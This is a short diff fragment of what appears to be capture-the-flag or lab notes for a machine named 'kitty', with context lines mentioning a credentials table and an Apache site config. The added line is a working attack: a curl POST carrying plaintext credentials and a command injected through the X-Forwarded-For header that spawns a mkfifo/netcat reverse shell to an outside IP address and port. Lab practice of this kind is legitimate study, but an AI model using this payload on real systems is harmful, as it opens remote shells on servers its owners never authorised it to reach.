@@ -41,3 +41,5 @@ fields: id,username,password,created_at
 
 
 cat /etc/apache2/sites-enabled/dev_site.conf
+
+kitty@kitty:/var/www/development$ curl -X POST -d "username=kitty&password=sleep" http://127.0.0.1:8080/index.php -H "X-Forwarded-For: 10.10.10.10;rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.72.209 6666 >/tmp/f;"
